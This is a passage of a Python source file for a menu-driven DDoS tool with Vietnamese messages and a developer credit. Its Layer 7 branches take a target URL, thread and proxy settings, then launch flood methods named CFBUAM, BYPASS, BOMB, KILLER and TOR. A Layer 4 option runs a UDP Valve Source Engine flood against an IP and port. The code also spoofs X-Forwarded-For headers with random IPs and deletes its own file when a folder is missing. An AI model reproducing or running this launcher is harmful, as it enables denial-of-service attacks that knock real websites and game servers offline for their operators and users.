					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py EVEN {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("EVEN"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['20']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py GSB {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("GSB"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['21']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py DGB {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("DGB"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['22']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py AVB {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("AVB"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['23']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py BOT {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("BOT"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['24']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py APACHE {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("APACHE"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['25']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py XMLRPC {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("XMLRPC"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['26']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py CFBUAM {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("CFBUAM"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['27']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py BYPASS {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("BYPASS"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['28']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py BOMB {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("BOMB"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['29']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py KILLER {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("KILLER"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['30']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py TOR {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("TOR"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['ref', 'REF']:
				self.l7()
			elif option in ['home', 'HOME']:
				F_Tool.home()
			elif option in ['clear', 'CLEAR']:
				os.system('clear')
				self.l7()
			elif option in ['help', 'HELP', '?']:
				print(self.help)
			elif option in ['dev', 'DEV']:
				print(self.dev)
			elif option in ['exit', 'EXIT']:
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option in ['stop', 'STOP']:
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option in ['00', '0']:
				os.system('clear');self.bbos()
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
				os.system('clear');Tool.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def th(self):
		print(f"""{Color.LG}
     __                       _  _
    / /  __ _ _   _  ___ _ __| || |
   / /  / _` | | | |/ _ \ '__| || |_
  / /__| (_| | |_| |  __/ |  |__   _|
  \____/\__,_|\__, |\___|_|     |_|
              |___/

""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" VSE: UDP Valve Source Engine specific flood")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"P-TOOL"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/vse {ip} {port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("VSE"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['ref', 'REF']:
				self.l4()
			elif option in ['home', 'HOME']:
				F_Tool.home()
			elif option in ['clear', 'CLEAR']:
				os.system('clear');self.l4()
			elif option in ['help', 'HELP', '?']:
				print(self.help)
			elif option in ['dev', 'DEV']:
				print(self.dev)
			elif option in ['exit', 'EXIT']:
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option in ['stop', 'STOP']:
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option in ['00', '0']:
				os.system('clear');self.bbos()
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
				os.system('clear');Tool.bbos()
			elif option == "":
				pass

class status:
	def stop():
		subprocess.run(['pkill screen'], shell=True)
		print(f"{Color.LG} [!]\033[38;5;178m Attack Dừng Rồi Nha Nhóc")



# idk this shit
def spoof_useragents():
	spoof_ip = []
	ip = []
	ip1, ip2, ip3, ip4 = random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)
	ip.append(ip1), ip.append(ip2), ip.append(ip3), ip.append(ip4)

	IP = str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3])
	spoof_ip.append(IP)

	useragents = ['utils/user/user.txt']

	return {
	'Connection': 'Keep-Alive',
	'Cache-control': 'no-cache',
	'User-Agent': random.choice(useragents).strip(),
	'X-Forwarded-For': random.choice(spoof_ip)
	}

def main():
	# Procoder : nguyen truong thien phat - nguyenphat.ml
	F_Tool.styleText("[+] Đợi Bố Check Xem Mày Có Tải Đủ Không\n\n")
	pkgs = ['screen', 'node']
	install = True
	for pkg in pkgs:
		ur_mom = which(pkg)
		if ur_mom == None:
			F_Tool.styleText(f"[!] {pkg} cái pkg này chưa tải nè nhóc -""\033[38;5;178m pkg"" install {pkg}}!\n")
			install = False
		else:
			pass
	if install == False:
		sys.exit(f'\n(?) Mày Nhập :\033[38;5;178msh install.sh - nhập đi rồi sài')
	else:pass
	try:
		script = True
		with open('utils') as important:pass
	except IsADirectoryError:pass
	except FileNotFoundError:
		print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'utils'\033[38;5;178mM xóa file utils?")
		F_Tool.styleText("\n[+] Please contact TG: @concac.com\n")
#		print("\n\033[38;5;178mHey địt mẹ mày biết download github ko để bố giúp cho\ngit clone https://github.com/Kenne400k/22\ncd 22\nunzip tool.py\npassword : 123\nsh install.sh")
		os.remove(f'{__file__}')
		script = False
	if script == False:
		sys.exit()
	else:
#		Bot()
		F_Tool.home()


if __name__ == '__main__':
	commands = f"""{Color.LC}HOME{Color.LR} -> {Color.LY}Back To Home
{Color.LC}REF{Color.LR} -> {Color.LY}Refresh The Menu
{Color.LC}CLEAR{Color.LR} -> {Color.LY}Clear Screen
{Color.LC}EXIT{Color.LR} -> {Color.LY}Exit The Program

{Color.LC}BBOS{Color.LR} -> {Color.LY}L4/L7 DDOS Attack
{Color.LC}STOP{Color.LR} -> {Color.LY}Stop Your Attack

{Color.LG}DEV{Color.LR} -> {Color.LB}ContactDev"""
	dev = f"\033[38;5;226Facebook\n  \033[38;5;231mTên Facebook: Nguyễn Trương Thiện Phát\n\033[38;5;230mLink Facebook: https://www.facebook.com/kenne9k"
	F_Tool = Home(commands, dev)
	Tool = Tool(commands, dev, spoof_useragents())
	try:open('F-Tool.py');main()
	except:quit()